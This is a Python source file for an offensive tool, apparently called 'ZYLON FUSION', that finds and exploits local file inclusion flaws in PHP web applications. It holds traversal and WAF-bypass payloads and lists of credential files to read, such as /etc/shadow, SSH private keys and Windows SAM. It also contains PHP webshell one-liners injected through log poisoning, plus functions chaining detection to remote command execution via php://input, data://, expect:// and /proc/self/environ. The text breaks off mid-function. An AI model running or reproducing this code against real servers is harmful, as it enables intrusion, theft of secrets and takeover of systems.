#!/usr/bin/env python3
"""
ZYLON FUSION v5.0.0 - Advanced LFI Engine
Fused from: LFITester (https://github.com/kostas-pa/LFITester)
           + LFIHunt (https://github.com/Chocapikk/LFIHunt)
           + PayloadsAllTheThings + Custom Zylon Techniques
Capabilities:
  - LFI detection with depth traversal (../../../etc/passwd)
  - PHP wrapper exploitation (php://filter, php://input, data://, expect://)
  - Null byte injection (%00)
  - Path truncation on older PHP
  - Log poisoning (Apache access.log, /var/log/auth.log)
  - PHP session file inclusion
  - /proc/self/environ inclusion
  - Filter bypass techniques (double encoding, Unicode, ....//.)
  - WAF bypass for LFI
  - Automatic exploitation chain (detect -> fingerprint -> exploit -> RCE)
  - Multi-path testing for common files
  - Windows LFI paths
Termux Compatible | No Root Required | Python 3.13+
"""

import requests
import re
import os
import time
import base64
import urllib.parse
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================================
# ANSI COLOR CODES (Termux-compatible)
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# ============================================================================
# ADVANCED LFI PAYLOAD DATABASE
# ============================================================================

# Depth traversal prefixes with various encoding
DEPTH_TRAVERSAL_PAYLOADS = [
    "../../../", "..\\..\\..\\", "..../", "....\\",
    "%2e%2e%2f", "%2e%2e%5c", "%2e%2e/",
    "..%252f", "..%255c",
    "..%c0%af", "..%c1%9c",
    "..%ef%bc%8f",  # fullwidth slash
    "%252e%252e%252f",  # double URL encoding
    "..%2f%2f", "..\\/",
    "....//", "....\\\\",
]

# Common Linux files for LFI testing
LFI_LINUX_TARGETS = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/resolv.conf",
    "/etc/issue",
    "/etc/redhat-release",
    "/etc/debian_version",
    "/etc/apache2/apache2.conf",
    "/etc/nginx/nginx.conf",
    "/etc/mysql/my.cnf",
    "/etc/php/php.ini",
    "/etc/php7/php.ini",
    "/etc/php8/php.ini",
    "/etc/crontab",
    "/etc/sudoers",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/fd/0",
    "/proc/version",
    "/proc/cpuinfo",
    "/proc/meminfo",
    "/proc/net/tcp",
    "/proc/net/arp",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/mail.log",
    "/var/log/sshd.log",
    "/home/{user}/.bash_history",
    "/home/{user}/.ssh/id_rsa",
    "/home/{user}/.ssh/authorized_keys",
    "/root/.bash_history",
    "/tmp/sess_*",
    "/var/lib/php/sessions/sess_*",
]

# Windows LFI targets
LFI_WINDOWS_TARGETS = [
    "C:/Windows/win.ini",
    "C:/Windows/System32/drivers/etc/hosts",
    "C:/Windows/System32/drivers/etc/lmhosts",
    "C:/Windows/System32/config/SAM",
    "C:/Windows/System32/config/SYSTEM",
    "C:/Windows/repair/SAM",
    "C:/Windows/repair/SYSTEM",
    "C:/Windows/Panther/unattend.xml",
    "C:/Windows/Panther/unattend.txt",
    "C:/inetpub/wwwroot/web.config",
    "C:/inetpub/logs/LogFiles/W3SVC1/ex*.log",
    "C:/Users/Administrator/.ssh/id_rsa",
    "C:/Users/Administrator/NTUSER.DAT",
    "C:/ProgramData/mysql/my.ini",
    "C:/boot.ini",
    "C:/autoexec.bat",
    "C:/Windows/debug/NetSetup.log",
    "C:/Windows/system32/config/AppEvent.Evt",
    "C:/Windows/system32/config/SecEvent.Evt",
]

# PHP Wrappers for LFI exploitation
PHP_WRAPPER_PAYLOADS = {
    "filter_base64": "php://filter/convert.base64-encode/resource={file}",
    "filter_rot13": "php://filter/read=string.rot13/resource={file}",
    "filter_strip_tags": "php://filter/read=string.strip_tags/resource={file}",
    "filter_toupper": "php://filter/read=string.toupper/resource={file}",
    "filter_tolower": "php://filter/read=string.tolower/resource={file}",
    "filter_convert": "php://filter/convert.iconv.utf-8.utf-16/resource={file}",
    "input": "php://input",
    "data_plain": "data://text/plain,{payload}",
    "data_base64": "data://text/plain;base64,{payload}",
    "expect": "expect://{command}",
    "phar": "phar://{file}",
    "zip": "zip://{file}",
}

# Null byte injection suffixes
NULL_BYTE_PAYLOADS = [
    "%00", "%00.jpg", "%00.png", "%00.txt", "%00.html",
    "%00.php", "%00%00", "/%00", "%00.gif", "%00.pdf",
    "0x00", "%00.bak",
]

# Path truncation suffixes (PHP < 5.3.4 on Windows, PHP < 5.3 on Linux)
PATH_TRUNCATION_SUFFIXES = [
    "." * 256,  # 256 dots for path truncation
    "." * 512,
    "/" * 256,
    "." * 1024,
]

# WAF bypass techniques for LFI
WAF_BYPASS_TECHNIQUES = {
    "double_encoding": lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=''), safe=''),
    "unicode_encoding": lambda p: p.replace("../", "..%c0%af").replace("..\\", "..%c1%9c"),
    "fullwidth_slash": lambda p: p.replace("/", "%ef%bc%8f"),
    "double_dot_bypass": lambda p: p.replace("../", "....//"),
    "null_byte": lambda p: p + "%00",
    "path_prefix": lambda p: "/." + p,  # /./etc/passwd
    "space_encoding": lambda p: p.replace(" ", "%20"),
    "tab_injection": lambda p: p.replace("../", "..\t/"),
    "newline_injection": lambda p: p.replace("../", "..\n/"),
    "reverse_slash": lambda p: p.replace("/", "\\"),
    "mixed_slash": lambda p: p.replace("../", "..\\/"),
    "dot_dot_dash": lambda p: p.replace("../", "..-/"),
    "null_prefix": lambda p: p.replace("/", "/%00/"),
}

# Log poisoning paths
LOG_POISON_TARGETS = [
    "/var/log/apache2/access.log",
    "/var/log/apache/access.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/auth.log",
    "/var/log/sshd.log",
    "/var/log/mail.log",
    "/var/log/vsftpd.log",
    "/var/log/proftpd.log",
    "/var/log/mysqld.log",
    "/usr/local/apache/logs/access.log",
    "/usr/local/apache/logs/error.log",
    "/opt/lampp/logs/access.log",
    "/opt/lampp/logs/error.log",
    "/var/log/apache2/access.log.1",
    "/var/log/nginx/access.log.1",
]

# Log poisoning payloads (injected via User-Agent / Referer)
LOG_POISON_PAYLOADS = [
    '<?php system($_GET["cmd"]); ?>',
    '<?php echo shell_exec($_GET["cmd"]); ?>',
    '<?php eval($_GET["cmd"]); ?>',
    '<?=`$_GET[cmd]`?>',
    '<?php passthru($_GET["cmd"]); ?>',
    '<?php echo `{$_GET["cmd"]}`; ?>',
    '<script language="php">system($_GET["cmd"]);</script>',
    '<?php $_GET["cmd"]; ?>',
]

# PHP session file paths
PHP_SESSION_PATHS = [
    "/tmp/sess_",
    "/var/lib/php/sessions/sess_",
    "/var/lib/php5/sess_",
    "/var/lib/php/session/sess_",
    "/tmp/php/sess_",
    "C:/Windows/Temp/sess_",
    "C:/php/tmp/sess_",
]

# Detection signatures for various file types
LFI_DETECT_SIGNATURES = {
    "linux_passwd": [
        r"root:x:0:0:", r"nobody:x:", r":/bin/(?:ba)?sh$",
        r":/home/", r":/usr/sbin/nologin", r":/bin/false$",
    ],
    "linux_shadow": [
        r"root:\$6\$", r"root:\$5\$", r"root:\$1\$",
        r"^[a-z0-9_]+:\$", r"!\s*$",
    ],
    "linux_hosts": [
        r"127\.0\.0\.1\s+localhost", r"::1\s+localhost",
        r"255\.255\.255\.255",
    ],
    "linux_issue": [
        r"\\n \\l", r"Ubuntu", r"Debian", r"CentOS",
    ],
    "windows_ini": [
        r"\[fonts\]", r"\[extensions\]", r"COM1\s*=",
        r"\[boot\]", r"shell\s*=",
    ],
    "windows_hosts": [
        r"127\.0\.0\.1\s+localhost",
    ],
    "proc_environ": [
        r"PATH=", r"HOME=", r"SHELL=", r"USER=",
        r"LANG=", r"HOSTNAME=",
    ],
    "proc_version": [
        r"Linux version", r"compiled with gcc",
    ],
    "apache_conf": [
        r"ServerRoot", r"DocumentRoot", r"Listen\s+\d+",
        r"<Directory", r"ServerName",
    ],
    "nginx_conf": [
        r"worker_processes", r"server\s*\{", r"location\s+/",
        r"upstream\s+\w+",
    ],
    "php_config": [
        r"engine\s*=", r"short_open_tag", r"disable_functions",
        r"open_basedir", r"allow_url_include",
    ],
    "ssh_key": [
        r"BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY",
    ],
    "crontab": [
        r"^\*\s+\*\s+\*\s+\*\s+\*", r"^@\w+", r"^\d+\s+\d+",
    ],
    "php_source": [
        r"<\?php", r"<\?=", r"<script\s+language",
    ],
}

# Common parameter names for LFI
LFI_PARAM_NAMES = [
    "file", "path", "page", "doc", "include", "template",
    "view", "content", "document", "folder", "dir",
    "show", "read", "load", "img", "image", "lang",
    "style", "pdf", "action", "module", "catalog",
    "recipe", "item", "body", "cat", "inc", "file_name",
    "filename", "url", "return", "next", "redirect",
    "callback", "src", "dest", "destination", "out",
    "output", "log", "skin", "debug", "test", "conf",
    "config", "site", "layout", "partial", "component",
]


class LFIAdvancedEngine:
    """Advanced LFI Exploitation Engine - Fused from LFITester + LFIHunt + PayloadsAllTheThings"""

    def __init__(self, target_url=None, parameter=None, method="GET", data=None,
                 headers=None, cookies=None, proxy=None, timeout=10, threads=15):
        self.target_url = target_url
        self.parameter = parameter or "file"
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.proxy = proxy
        self.timeout = timeout
        self.threads = threads
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36'
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.findings = []
        self.lock = threading.Lock()

    def _print(self, msg, color=CYAN):
        """Thread-safe colored print"""
        with self.lock:
            print(f"{color}{msg}{RESET}")

    def _send_request(self, url, method=None, data=None, headers=None):
        """Send HTTP request with error handling"""
        try:
            m = method or self.method
            d = data or self.data
            h = headers or self.headers
            if m == "GET":
                resp = self.session.get(url, params=d, headers=h,
                                       cookies=self.cookies, timeout=self.timeout,
                                       allow_redirects=True)
            else:
                resp = self.session.post(url, data=d, headers=h,
                                        cookies=self.cookies, timeout=self.timeout,
                                        allow_redirects=True)
            return resp
        except Exception:
            return None

    def _inject_payload(self, payload, param=None):
        """Inject payload into the target parameter"""
        p = param or self.parameter
        if not p:
            return None
        sep = "&" if "?" in self.target_url else "?"
        url = f"{self.target_url}{sep}{p}={urllib.parse.quote(payload, safe='')}"
        return self._send_request(url, method="GET")

    def _inject_payload_raw(self, payload, param=None):
        """Inject payload without URL encoding"""
        p = param or self.parameter
        if not p:
            return None
        sep = "&" if "?" in self.target_url else "?"
        url = f"{self.target_url}{sep}{p}={payload}"
        return self._send_request(url, method="GET")

    def _check_signatures(self, content, file_type=None):
        """Check response content against LFI detection signatures"""
        if content is None:
            return []
        text = content if isinstance(content, str) else content.decode('utf-8', errors='ignore')
        matches = []
        for sig_name, patterns in LFI_DETECT_SIGNATURES.items():
            if file_type and sig_name != file_type:
                continue
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE | re.MULTILINE):
                    matches.append(sig_name)
                    break
        return list(set(matches))

    def _build_traversal(self, depth, file_path, encoding=""):
        """Build path traversal payload with depth and encoding"""
        if encoding:
            traversal = encoding * depth
        else:
            traversal = "../" * depth
        target = file_path.lstrip("/")
        return traversal + target

    def _try_base64_decode(self, content):
        """Attempt to extract and decode base64 content from response"""
        b64_patterns = [
            r'[A-Za-z0-9+/]{20,}={0,2}',
            r'(%3[A-F]|%2[F-B]|%3[0-9]|[A-Za-z0-9+/=]){20,}',  # URL-encoded base64
        ]
        for pattern in b64_patterns:
            match = re.search(pattern, content)
            if match:
                try:
                    decoded = base64.b64decode(match.group()).decode('utf-8', errors='ignore')
                    if len(decoded) > 5:
                        return decoded
                except Exception:
                    pass
        return None

    # ========================================================================
    # SCAN: LFI Detection (Depth Traversal + Multi-Encoding + Null Byte)
    # ========================================================================

    def detect_lfi(self, url=None, param=None):
        """Detect LFI vulnerability using depth traversal, encoding, and null byte injection"""
        target_url = url or self.target_url
        parameter = param or self.parameter

        self._print(f"[*] LFI Advanced Detection on {target_url}", CYAN)

        results = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "parameter": parameter,
                "os_detected": None,
                "best_payload": None,
                "files_read": [],
            },
            "scan_type": "lfi_advanced_detect",
        }

        # Phase 1: Quick test with /etc/passwd at multiple depths
        test_file = "/etc/passwd"
        found = False

        for depth in range(1, 10):
            if found:
                break
            for encoding in DEPTH_TRAVERSAL_PAYLOADS[:6]:
                if found:
                    break
                for null_byte in ["%00", ""]:
                    payload = self._build_traversal(depth, test_file, encoding)
                    payload += null_byte
                    resp = self._inject_payload(payload, parameter)
                    if resp and resp.status_code == 200:
                        sigs = self._check_signatures(resp.text, "linux_passwd")
                        if sigs:
                            results["vulnerable"] = True
                            results["findings"].append({
                                "type": "depth_traversal",
                                "depth": depth,
                                "encoding": encoding or "standard",
                                "null_byte": bool(null_byte),
                                "payload": payload,
                                "signatures": sigs,
                                "status_code": resp.status_code,
                                "content_length": len(resp.text),
                            })
                            results["details"]["os_detected"] = "Linux"
                            results["details"]["best_payload"] = payload

                            # Extract user list
                            try:
                                users = [l.split(":")[0] for l in resp.text.strip().split("\n") if ":" in l]
                                results["details"]["files_read"].append({
                                    "file": test_file,
                                    "users": users[:15],
                                })
                            except Exception:
                                pass

                            self._print(f"[+] LFI DETECTED! Depth={depth}, Encoding={encoding or 'standard'}", GREEN)
                            found = True
                            break

        # Phase 2: Test Windows targets if Linux not found
        if not found:
            for depth in range(1, 8):
                if found:
                    break
                for win_file in ["C:/Windows/win.ini", "C:/Windows/System32/drivers/etc/hosts"]:
                    if found:
                        break
                    for null_byte in ["%00", ""]:
                        payload = self._build_traversal(depth, win_file, "")
                        payload += null_byte
                        resp = self._inject_payload(payload, parameter)
                        if resp and resp.status_code == 200:
                            sigs = self._check_signatures(resp.text, "windows_ini")
                            if not sigs:
                                sigs = self._check_signatures(resp.text, "windows_hosts")
                            if sigs:
                                results["vulnerable"] = True
                                results["findings"].append({
                                    "type": "depth_traversal_windows",
                                    "depth": depth,
                                    "null_byte": bool(null_byte),
                                    "payload": payload,
                                    "signatures": sigs,
                                })
                                results["details"]["os_detected"] = "Windows"
                                results["details"]["best_payload"] = payload
                                self._print(f"[+] LFI DETECTED (Windows)! File={win_file}", GREEN)
                                found = True
                                break

        # Phase 3: Test null byte injection specifically
        if found and not any(f.get("null_byte") for f in results["findings"]):
            best = results["details"].get("best_payload", "")
            for null_suffix in NULL_BYTE_PAYLOADS[:4]:
                payload = best + null_suffix
                resp = self._inject_payload(payload, parameter)
                if resp and resp.status_code == 200:
                    sigs = self._check_signatures(resp.text)
                    if sigs:
                        results["findings"].append({
                            "type": "null_byte_injection",
                            "null_suffix": null_suffix,
                            "payload": payload,
                            "signatures": sigs,
                        })
                        self._print(f"[+] Null byte injection works: {null_suffix}", GREEN)
                        break

        # Phase 4: Test path truncation (older PHP)
        if found:
            best_base = results["details"].get("best_payload", "../../../../../../etc/passwd")
            for trunc in PATH_TRUNCATION_SUFFIXES[:2]:
                payload = best_base + trunc
                try:
                    resp = self._inject_payload_raw(payload, parameter)
                    if resp and resp.status_code == 200:
                        sigs = self._check_signatures(resp.text)
                        if sigs:
                            results["findings"].append({
                                "type": "path_truncation",
                                "truncation_length": len(trunc),
                                "payload_preview": payload[:80],
                                "signatures": sigs,
                            })
                            self._print(f"[+] Path truncation works (len={len(trunc)})", GREEN)
                            break
                except Exception:
                    pass

        if not results["vulnerable"]:
            self._print("[-] No LFI vulnerability detected", YELLOW)

        return results

    # ========================================================================
    # SCAN: OS Fingerprinting via LFI
    # ========================================================================

    def fingerprint_os(self, url=None, param=None):
        """Determine target OS via LFI file content analysis"""
        target_url = url or self.target_url
        parameter = param or self.parameter

        self._print(f"[*] OS Fingerprinting via LFI on {target_url}", CYAN)

        results = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "os": None,
                "os_version": None,
                "kernel": None,
                "hostname": None,
                "users": [],
                "network_info": [],
                "services": [],
            },
            "scan_type": "lfi_fingerprint_os",
        }

        # Fingerprint files for OS detection
        fingerprint_files = {
            "linux": [
                ("/etc/passwd", "linux_passwd"),
                ("/etc/issue", "linux_issue"),
                ("/etc/hostname", None),
                ("/proc/version", "proc_version"),
                ("/etc/redhat-release", None),
                ("/etc/debian_version", None),
                ("/etc/lsb-release", None),
                ("/proc/cpuinfo", None),
                ("/etc/resolv.conf", None),
                ("/proc/net/tcp", None),
            ],
            "windows": [
                ("C:/Windows/win.ini", "windows_ini"),
                ("C:/Windows/System32/drivers/etc/hosts", "windows_hosts"),
                ("C:/boot.ini", None),
            ],
        }

        # Test Linux files
        for file_path, sig_type in fingerprint_files["linux"]:
            for depth in range(1, 8):
                payload = self._build_traversal(depth, file_path, "")
                resp = self._inject_payload(payload, parameter)
                if resp and resp.status_code == 200:
                    sigs = self._check_signatures(resp.text, sig_type) if sig_type else []
                    content = resp.text.strip()

                    if sigs or len(content) > 20:
                        results["vulnerable"] = True
                        results["details"]["os"] = "Linux"
                        results["findings"].append({
                            "file": file_path,
                            "depth": depth,
                            "signatures": sigs,
                            "preview": content[:300],
                        })

                        # Parse OS info
                        if "passwd" in file_path:
                            try:
                                users = [l.split(":")[0] for l in content.split("\n") if ":" in l and not l.startswith("#")]
                                results["details"]["users"] = users[:20]
                            except Exception:
                                pass

                        elif "issue" in file_path:
                            results["details"]["os_version"] = content[:100]

                        elif "version" in file_path and "proc" in file_path:
                            # Extract kernel version
                            kernel_match = re.search(r'Linux version ([^\s]+)', content)
                            if kernel_match:
                                results["details"]["kernel"] = kernel_match.group(1)
                            gcc_match = re.search(r'gcc version ([^\s]+)', content)
                            if gcc_match:
                                results["details"].setdefault("services", []).append(f"gcc {gcc_match.group(1)}")

                        elif "hostname" in file_path:
                            results["details"]["hostname"] = content.split("\n")[0].strip()

                        elif "resolv" in file_path:
                            nameservers = re.findall(r'nameserver\s+([\d.]+)', content)
                            if nameservers:
                                results["details"]["network_info"] = nameservers

                        self._print(f"[+] Read: {file_path} (depth={depth})", GREEN)
                        break

        # Test Windows if Linux not detected
        if not results["details"]["os"]:
            for file_path, sig_type in fingerprint_files["windows"]:
                for depth in range(1, 8):
                    payload = self._build_traversal(depth, file_path, "")
                    resp = self._inject_payload(payload, parameter)
                    if resp and resp.status_code == 200:
                        sigs = self._check_signatures(resp.text, sig_type) if sig_type else []
                        if sigs or len(resp.text.strip()) > 10:
                            results["vulnerable"] = True
                            results["details"]["os"] = "Windows"
                            results["findings"].append({
                                "file": file_path, "depth": depth,
                                "signatures": sigs, "preview": resp.text[:300],
                            })
                            self._print(f"[+] Read: {file_path} (Windows, depth={depth})", GREEN)
                            break

        if results["details"]["os"]:
            self._print(f"[+] OS Fingerprinted: {results['details']['os']}", GREEN)
            if results["details"]["kernel"]:
                self._print(f"    Kernel: {results['details']['kernel']}", CYAN)
            if results["details"]["os_version"]:
                self._print(f"    Version: {results['details']['os_version']}", CYAN)
        else:
            self._print("[-] Could not fingerprint OS", YELLOW)

        return results

    # ========================================================================
    # SCAN: PHP Wrapper Exploitation
    # ========================================================================

    def exploit_php_wrappers(self, url=None, param=None):
        """Exploit LFI using PHP wrappers (filter, input, data, expect)"""
        target_url = url or self.target_url
        parameter = param or self.parameter

        self._print(f"[*] PHP Wrapper Exploitation on {target_url}", CYAN)

        results = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "wrappers_working": [],
                "extracted_data": {},
                "rce_achieved": False,
                "rce_methods": [],
                "command_output": None,
            },
            "scan_type": "lfi_php_wrappers",
        }

        test_file = "/etc/passwd"

        # Test 1: php://filter for source code extraction
        filter_wrappers = [
            ("filter_base64", f"php://filter/convert.base64-encode/resource={test_file}"),
            ("filter_rot13", f"php://filter/read=string.rot13/resource={test_file}"),
            ("filter_convert_iconv", f"php://filter/convert.iconv.utf-8.utf-16/resource={test_file}"),
        ]

        for wrapper_name, payload in filter_wrappers:
            resp = self._inject_payload(payload, parameter)
            if resp and resp.status_code == 200:
                content = resp.text
                decoded = self._try_base64_decode(content)
                if decoded:
                    sigs = self._check_signatures(decoded)
                    results["vulnerable"] = True
                    results["findings"].append({
                        "wrapper": wrapper_name,
                        "file": test_file,
                        "decoded_length": len(decoded),
                        "preview": decoded[:200],
                        "signatures": sigs,
                    })
                    results["details"]["wrappers_working"].append(wrapper_name)
                    results["details"]["extracted_data"][test_file] = decoded
                    self._print(f"[+] PHP Wrapper {wrapper_name} works! Decoded {len(decoded)} bytes", GREEN)
                else:
                    # Check if content itself contains signatures (rot13, etc.)
                    sigs = self._check_signatures(content)
                    if sigs or len(content) > 50:
                        results["vulnerable"] = True
                        results["findings"].append({
                            "wrapper": wrapper_name,
                            "file": test_file,
                            "content_length": len(content),
                            "signatures": sigs,
                        })
                        results["details"]["wrappers_working"].append(wrapper_name)
                        self._print(f"[+] PHP Wrapper {wrapper_name} works! Length: {len(content)}", GREEN)

        # Test 2: php://input for RCE
        command = "id"
        php_payload = f"<?php system('{command}'); ?>"
        sep = "&" if "?" in target_url else "?"
        url = f"{target_url}{sep}{parameter}=php://input"
        resp = self._send_request(url, method="POST", data=php_payload)
        if resp and resp.status_code == 200:
            if "uid=" in resp.text or "gid=" in resp.text:
                results["vulnerable"] = True
                results["details"]["rce_achieved"] = True
                results["details"]["rce_methods"].append("php://input")
                results["details"]["command_output"] = resp.text.strip()[:500]
                results["findings"].append({
                    "wrapper": "php://input",
                    "rce": True,
                    "command": command,
                    "output": resp.text.strip()[:300],
                })
                self._print(f"[+] RCE via php://input! Output: {resp.text.strip()[:100]}", RED + BOLD)

        # Test 3: data:// wrapper for RCE
        b64_cmd = base64.b64encode(f"<?php system('{command}'); ?>".encode()).decode()
        data_payloads = [
            f"data://text/plain,<?php system('{command}'); ?>",
            f"data://text/plain;base64,{b64_cmd}",
        ]
        for payload in data_payloads:
            resp = self._inject_payload(payload, parameter)
            if resp and resp.status_code == 200:
                if "uid=" in resp.text or "gid=" in resp.text:
                    results["vulnerable"] = True
                    results["details"]["rce_achieved"] = True
                    results["details"]["rce_methods"].append("data://")
                    results["details"]["command_output"] = resp.text.strip()[:500]
                    results["findings"].append({
                        "wrapper": "data://",
                        "rce": True,
                        "command": command,
                        "output": resp.text.strip()[:300],
                    })
                    self._print(f"[+] RCE via data:// wrapper!", RED + BOLD)
                    break

        # Test 4: expect:// wrapper for RCE
        expect_payload = f"expect://{command}"
        resp = self._inject_payload(expect_payload, parameter)
        if resp and resp.status_code == 200:
            if len(resp.text) > 0 and ("uid=" in resp.text or len(resp.text.strip()) > 5):
                results["vulnerable"] = True
                results["details"]["rce_achieved"] = True
                results["details"]["rce_methods"].append("expect://")
                results["findings"].append({
                    "wrapper": "expect://",
                    "rce": True,
                    "command": command,
                    "output": resp.text.strip()[:300],
                })
                self._print(f"[+] RCE via expect:// wrapper!", RED + BOLD)

        # Test 5: Extract multiple source files if base64 filter works
        if "filter_base64" in results["details"]["wrappers_working"]:
            source_files = [
                "/etc/passwd", "/etc/shadow", "/etc/hosts",
                "/var/www/html/index.php", "/var/www/html/config.php",
                "/var/www/html/wp-config.php",
            ]
            for fpath in source_files:
                payload = f"php://filter/convert.base64-encode/resource={fpath}"
                resp = self._inject_payload(payload, parameter)
                if resp and resp.status_code == 200:
                    decoded = self._try_base64_decode(resp.text)
                    if decoded and len(decoded) > 10:
                        results["details"]["extracted_data"][fpath] = decoded
                        self._print(f"    Extracted: {fpath} ({len(decoded)} bytes)", GREEN)

        if not results["vulnerable"]:
            self._print("[-] No PHP wrappers exploitable", YELLOW)

        return results

    # ========================================================================
    # SCAN: Log Poisoning RCE
    # ========================================================================

    def exploit_log_poisoning(self, url=None, param=None):
        """Exploit LFI via log poisoning for RCE"""
        target_url = url or self.target_url
        parameter = param or self.parameter

        self._print(f"[*] Log Poisoning RCE on {target_url}", CYAN)

        results = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "poisoned_logs": [],
                "rce_achieved": False,
                "command_output": None,
                "log_path_found": None,
            },
            "scan_type": "lfi_log_poisoning",
        }

        command = "id"

        # Phase 1: Poison logs by injecting PHP code in User-Agent / Referer
        self._print(f"[*] Phase 1: Poisoning logs with PHP payloads...", CYAN)

        for poison_payload in LOG_POISON_PAYLOADS[:3]:
            poisoned_headers = self.headers.copy()
            poisoned_headers['User-Agent'] = poison_payload
            poisoned_headers['Referer'] = poison_payload
            try:
                self.session.get(target_url, headers=poisoned_headers,
                                timeout=self.timeout, allow_redirects=True)
            except Exception:
                pass

            # Also try poisoning via a request path
            try:
                self.session.get(f"{target_url}/{urllib.parse.quote(poison_payload)}",
                                timeout=self.timeout, allow_redirects=True)
            except Exception:
                pass

        self._print(f"[*] Phase 2: Searching for poisoned logs...", CYAN)

        # Phase 2: Access log files via LFI and try command execution
        for log_path in LOG_POISON_TARGETS:
            for depth in range(1, 9):
                traversal = self._build_traversal(depth, log_path, "")
                sep = "&" if "?" in target_url else "?"
                url = f"{target_url}{sep}{parameter}={urllib.parse.quote(traversal)}&cmd={command}"
                try:
                    resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                    if resp and resp.status_code == 200:
                        text = resp.text
                        # Check for command execution indicators
                        cmd_indicators = [
                            r"uid=\d+\(?\w*\)?\s+gid=\d+",
                            r"uid=\d+",
                            r"gid=\d+",
                            r"groups=\d+",
                        ]
                        for pattern in cmd_indicators:
                            if re.search(pattern, text):
                                results["vulnerable"] = True
                                results["details"]["rce_achieved"] = True
                                results["details"]["log_path_found"] = log_path
                                results["details"]["command_output"] = text.strip()[:500]
                                results["findings"].append({
                                    "type": "log_poisoning_rce",
                                    "log_path": log_path,
                                    "depth": depth,
                                    "command": command,
                                    "output": text.strip()[:300],
                                })
                                results["details"]["poisoned_logs"].append(log_path)
                                self._print(f"[+] RCE VIA LOG POISONING! Log: {log_path}", RED + BOLD)
                                self._print(f"    Command output: {text.strip()[:100]}", GREEN)
                                return results

                        # Check if log file is accessible (even without RCE)
                        log_sigs = [
                            r"GET\s+/", r"POST\s+/", r"HTTP/1\.",
                            r"Mozilla/", r"200\s+\d+",
                        ]
                        for sig in log_sigs:
                            if re.search(sig, text):
                                results["vulnerable"] = True
                                results["findings"].append({
                                    "type": "log_file_readable",
                                    "log_path": log_path,
                                    "depth": depth,
                                    "note": "Log file readable but RCE not confirmed",
                                })
                                results["details"]["poisoned_logs"].append(log_path)
                                self._print(f"[+] Log file readable: {log_path} (depth={depth})", YELLOW)
                                break
                except Exception:
                    continue

        # Phase 3: PHP Session file inclusion
        self._print(f"[*] Phase 3: Testing PHP session file inclusion...", CYAN)

        for sess_path in PHP_SESSION_PATHS:
            # Try common session IDs
            test_sess_ids = ["test", "phpsessid", "session", "admin"]
            for sess_id in test_sess_ids:
                full_path = f"{sess_path}{sess_id}"
                for depth in range(1, 7):
                    payload = self._build_traversal(depth, full_path, "")
                    resp = self._inject_payload(payload, parameter)
                    if resp and resp.status_code == 200:
                        # Check for PHP session content
                        if any(k in resp.text for k in ["cmd", "PHPSESSID", "|"]):
                            results["findings"].append({
                                "type": "php_session_inclusion",
                                "session_path": full_path,
                                "depth": depth,
                            })
                            self._print(f"[+] PHP session file accessible: {full_path}", GREEN)
                            break

        if not results["vulnerable"]:
            self._print("[-] Log poisoning not successful", YELLOW)

        return results

    # ========================================================================
    # SCAN: /proc/self Exploitation
    # ========================================================================

    def exploit_proc_self(self, url=None, param=None):
        """Exploit LFI via /proc/self/ entries"""
        target_url = url or self.target_url
        parameter = param or self.parameter

        self._print(f"[*] /proc/self Exploitation on {target_url}", CYAN)

        results = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "environ_leaked": False,
                "env_vars": [],
                "cmdline": None,
                "fd_files": [],
                "rce_achieved": False,
                "command_output": None,
            },
            "scan_type": "lfi_proc_self",
        }

        command = "id"

        # Test /proc/self/environ
        for depth in range(1, 8):
            payload = self._build_traversal(depth, "/proc/self/environ", "")
            resp = self._inject_payload(payload, parameter)
            if resp and resp.status_code == 200:
                sigs = self._check_signatures(resp.text, "proc_environ")
                env_matches = re.findall(r'(\w+)=([^\x00\n]+)', resp.text)
                if sigs or (env_matches and len(env_matches) > 3):
                    results["vulnerable"] = True
                    results["details"]["environ_leaked"] = True
                    results["details"]["env_vars"] = [(k, v[:80]) for k, v in env_matches[:30]]
                    results["findings"].append({
                        "type": "proc_environ",
                        "depth": depth,
                        "env_count": len(env_matches),
                        "vars": [(k, v[:50]) for k, v in env_matches[:15]],
                    })
                    self._print(f"[+] /proc/self/environ LEAKED! {len(env_matches)} env vars found", GREEN)

                    # Try RCE via User-Agent poisoning
                    poison_ua = f"<?php system('{command}'); ?>"
                    poisoned_headers = self.headers.copy()
                    poisoned_headers['User-Agent'] = poison_ua
                    try:
                        self.session.get(target_url, headers=poisoned_headers,
                                        timeout=self.timeout, allow_redirects=True)
                    except Exception:
                        pass

                    # Re-access environ with command
                    sep = "&" if "?" in target_url else "?"
                    url = f"{target_url}{sep}{parameter}={urllib.parse.quote(payload)}&cmd={command}"
                    resp2 = self._send_request(url, method="GET")
                    if resp2 and ("uid=" in resp2.text or "gid=" in resp2.text):
                        results["details"]["rce_achieved"] = True
                        results["details"]["command_output"] = resp2.text.strip()[:500]
                        results["findings"].append({
                            "type": "proc_environ_rce",
                            "command": command,
                            "output": resp2.text.strip()[:300],
                        })
                        self._print(f"[+] RCE via /proc/self/environ!", RED + BOLD)
                    break

        # Test /proc/self/cmdline
        for depth in range(1, 7):
